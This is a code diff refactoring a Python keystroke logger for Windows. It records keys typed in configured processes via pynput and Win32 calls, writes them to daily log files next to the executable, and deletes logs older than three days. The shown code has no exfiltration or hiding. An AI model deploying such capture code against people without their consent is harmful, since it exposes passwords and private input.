@@ -1,16 +1,16 @@
-from pynput import keyboard
 import os
 import sys
+import json
 import logging
-from datetime import datetime, timedelta
-import psutil
-import win32gui
-import win32process
 import ctypes
 from ctypes import wintypes
-import json
+from datetime import datetime, timedelta
+import win32gui
+import win32process
+import psutil
+from pynput import keyboard
 
-# ─── CONFIG ─────────────────────────────────────────────────────
+
 def load_config():
     """
     Загружает конфигурацию из config.json рядом с EXE файлом.
@@ -27,12 +27,12 @@ def load_config():
 
         config_path = os.path.normpath(config_path)
 
-
         with open(config_path, 'r', encoding='utf-8') as f:
             return json.load(f)
 
     except Exception as e:
         logging.exception("Failed to load config.json")
+        return {}  # Возвращаем пустой словарь при ошибке
 
 
 def get_base_dir():
@@ -41,6 +41,7 @@ def get_base_dir():
     return os.path.dirname(os.path.abspath(__file__))
 
 
+# Загружаем конфиг
 config = load_config()
 ALLOWED_PROCESSES = [p.lower() for p in config.get("allowed_processes", [])]
 READABLE_KEYS = {
@@ -48,7 +49,7 @@ READABLE_KEYS = {
     for k, v in config.get("readable_keys", {}).items()
 }
 
-# ─── WINDOWS API INPUT ──────────────────────────────────────────
+# Инициализация Windows API функций
 user32 = ctypes.WinDLL('user32', use_last_error=True)
 GetKeyboardLayout = user32.GetKeyboardLayout
 GetKeyboardLayout.restype = wintypes.HKL
@@ -57,25 +58,53 @@ ToUnicodeEx = user32.ToUnicodeEx
 
 EN_LAYOUT = 0x4090409  # en-US
 
-# ─── LOGGING SETUP ──────────────────────────────────────────────
 pressed_keys = set()
-log_dir = os.path.join(get_base_dir(), "logs")
-os.makedirs(log_dir, exist_ok=True)
+
+
+def get_log_dir():
+    """
+    Возвращает путь к папке logs.
+    """
+    if getattr(sys, 'frozen', False):
+        # Для EXE: logs рядом с исполняемым файлом
+        base_dir = os.path.dirname(sys.executable)
+        log_dir = os.path.join(base_dir, 'logs')
+    else:
+        # Для Python: logs в корне проекта
+        base_dir = os.path.dirname(os.path.abspath(__file__))
+        log_dir = os.path.join(base_dir, '..', '..', 'logs')
+
+    # Нормализуем путь
+    log_dir = os.path.normpath(log_dir)
+
+    # Создаем папку если ее нет
+    os.makedirs(log_dir, exist_ok=True)
+    return log_dir
+
 
 def get_log_file_path():
-    today = datetime.now().strftime("%Y-%m-%d")
-    return os.path.join(log_dir, f"{today}_keylog.txt")
+    """
+    Возвращает полный путь к файлу лога.
+    """
+    log_dir = get_log_dir()
+    date_str = datetime.now().strftime("%Y-%m-%d")
+    return os.path.join(log_dir, f"{date_str}_keylog.txt")
+
 
 def cleanup_old_logs():
+    log_dir = get_log_dir()
     cutoff = datetime.now() - timedelta(days=3)
     for fname in os.listdir(log_dir):
         try:
-            date_str = fname.split("_")[0]
-            file_date = datetime.strptime(date_str, "%Y-%m-%d")
-            if file_date < cutoff:
-                os.remove(os.path.join(log_dir, fname))
+            file_path = os.path.join(log_dir, fname)
+            if os.path.isfile(file_path):
+                # Получаем дату создания файла
+                creation_time = datetime.fromtimestamp(os.path.getctime(file_path))
+                if creation_time < cutoff:
+                    os.remove(file_path)
         except Exception:
             continue
+
 
 # ─── UTILS ──────────────────────────────────────────────────────
 def get_active_console_info():
@@ -91,25 +120,32 @@ def get_active_console_info():
         pass
     return None, None
 
+
 def get_en_char_from_key(key):
     if key in READABLE_KEYS:
         return READABLE_KEYS[key]
 
     try:
-        vk = getattr(key, 'vk', None)
-        if vk is None and hasattr(key, 'value'):
-            vk = getattr(key.value, 'vk', None)
-        if vk is None:
+        # Получаем виртуальный ключ
+        if hasattr(key, 'vk'):
+            vk = key.vk
+        elif hasattr(key, 'value') and hasattr(key.value, 'vk'):
+            vk = key.value.vk
+        else:
             return f"[{key}]"
 
         scan_code = MapVirtualKeyEx(vk, 0, EN_LAYOUT)
         buf = ctypes.create_unicode_buffer(8)
         keystate = (ctypes.c_byte * 256)()
-        result = ToUnicodeEx(vk, scan_code, keystate, buf, len(buf), 0, EN_LAYOUT)
+        result = ToUnicodeEx(vk, scan_code, keystate, buf, len(buf) - 1, 0, EN_LAYOUT)
 
-        return buf.value if result > 0 else f"[{key}]"
+        if result > 0:
+            return buf.value
+        else:
+            return f"[{key}]"
     except Exception:
         return f"[{key}]"
+
 
 # ─── MAIN LOGGER ────────────────────────────────────────────────
 def start_keylogger():
@@ -119,10 +155,11 @@ def start_keylogger():
     current_title = None
     current_line = ""
     last_time = ""
+    log_file_path = get_log_file_path()
 
     def write_line(line):
         try:
-            with open(get_log_file_path(), "a", encoding="utf-8") as f:
+            with open(log_file_path, "a", encoding="utf-8") as f:
                 f.write(line + "\n")
         except Exception:
             logging.exception("Failed to write keylog")
@@ -172,6 +209,7 @@ def start_keylogger():
             listener.join()
     except Exception:
         logging.exception("Keylogger crashed")
+
 
 if __name__ == "__main__":
     start_keylogger()
